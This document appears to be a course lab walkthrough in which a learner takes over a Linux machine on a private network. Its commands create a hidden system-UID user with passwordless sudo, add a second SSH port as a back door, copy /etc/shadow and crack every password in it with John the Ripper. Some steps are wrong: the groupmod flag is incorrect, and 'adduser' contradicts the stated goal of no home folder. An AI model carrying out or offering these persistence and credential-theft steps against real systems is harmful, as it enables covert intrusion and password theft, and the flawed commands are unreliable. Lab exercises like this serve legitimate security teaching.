# Advanced Bash - Owning the System
[Site reference #1](https://www.cyberciti.biz/faq/linux-set-change-password-how-to/)
[Site referance #2](https://phoenixnap.com/kb/how-to-enable-ssh-on-ubuntu)

## Shadow People
Create a secret user named sysd. Make sure this user doesn't have a home folder created:
`sudo adduser sysd`

Give your secret user a password:
`sudo passwd sysd`

Give your secret user a system UID < 1000:
`sudo usermod -u 900 sysd`

Give your secret user the same GID:
`sudo groupmod -u 900 sysd`

Give your secret user full sudo access without the need for a password:
`sudo visudo`
```bash
sysd ALL=(ALL:ALL) ALL 
sysd ALL=(ALL:ALL) NOPASSWD:ALL
```

Test that sudo access works without your password:
`sudo -l`

## Smooth Sailing
Edit the sshd_config file:
```bash
Port 22
Port 2222
```

## Testing Your Configuration Update
Restart the SSH service:
`sudo systemctl restart sshd.service`

Exit the root account:
`exit`

SSH to the target machine using your sysd account and port 2222:
`ssh sysd@192.168.6.105 -p 2222`

Use sudo to switch to the root user:
`sudo -s`

## Crack All the Passwords
SSH back to the system using your sysd account and port 2222:
`ssh sysd@192.168.6.105 -p 2222`

Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
`sudo -s`
`cp /etc/shadow ./shadow_copy`
`john shadow_copy`
`john shadow_copy --show`

